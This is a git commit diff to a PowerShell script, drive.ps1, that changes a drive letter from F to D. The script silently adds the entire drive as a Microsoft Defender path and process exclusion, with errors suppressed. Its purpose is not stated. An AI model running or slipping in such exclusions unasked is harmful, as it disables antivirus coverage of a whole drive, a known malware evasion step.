efa5c888ed8757e0eac9b40cd74acca5b8ebee45
ashlion-jpg <andresreus266@gmail.com>
2026-04-01 15:32:00 +0600

    Update drive.ps1

--- drive.ps1
+++ drive.ps1
@@ -1,7 +1,7 @@
-Write-Host "    [+] Adding exclusions for F drive"
-$exclusionPaths = @("F:\", "F:\*")
+Write-Host "    [+] Adding exclusions for D drive"
+$exclusionPaths = @("D:\", "D:\*")
 foreach ($path in $exclusionPaths) {
-    if ($path -eq "F:\") {
+    if ($path -eq "D:\") {
         Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
     } else {
         Add-MpPreference -ExclusionProcess $path -ErrorAction SilentlyContinue
